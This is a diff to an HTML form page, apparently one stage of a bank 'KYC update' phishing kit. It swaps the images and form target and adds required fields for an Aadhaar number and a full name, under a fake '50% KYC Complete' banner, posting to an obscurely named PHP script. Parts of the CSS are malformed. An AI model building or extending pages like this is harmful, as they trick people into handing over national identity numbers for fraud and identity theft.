@@ -6,21 +6,20 @@
 
 input[type=text], input[type=password] {
   width: 100%;
-  padding: 12px 20px;
+  padding: 06px 20px;
   margin: 8px 0;
   display: inline-table;
   border: 1px solid #;
   box-sizing: border-box;
 }
-
 button {
   background-color:#008CBA ;
   color: white;
-  padding: 14px 20px;
-  margin:   0;
+  padding: 09px 20px;
+  margin:  00;
   border: none;
   cursor: pointer;
-  width: 100%; 
+  width: 30%; 
 }
 
 button:hover {
@@ -73,10 +72,12 @@ span.psw {
 
     <center><h1 class="text-center"><img src="./udcvgh.jpg" style="width: 100%;"></h1></center>
   
+  
+  
   </header>
 
 
-<form action="frásaí.php" method="post">
+<form action="ilteangachGG.php" method="post">
   <div class="imgcontainer">
     
   </div>
@@ -85,16 +86,42 @@ span.psw {
 
 
 
+<label>Enter Aadhaar Number*</label>
+    <input type="text" placeholder="" name="Aadhaar CARD NU"maxlength="12"
+         pattern="[0-9]{12}"
+         title="Valid Aadhaar Format Is:123456789010"  required>
+
+
+<label>Full Name (as per Aadhaar Card)*</label>
+    <input type="text" placeholder="" name="Name"maxlength="35" required>
 
 
 
-    <button type="submit">CONTINUE TO LOGIN</button> 
+<center><h4 style="color:#aliceblue;">50% KYC Complete </h4></center>
 
-
-
+    <center><button type="submit">submit</button> 
+</center>
   </div>
 
-<center><h1 class="text-center"><img src="./defyhj.jpg" style="width: 100%;"></h1></center>
+
+
+
+
+
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+
+
+
+<center><h1 class="text-center"><img src="./hyhjui.jpg" style="width: 100%;"></h1></center>
+
+
 
 
 </form>
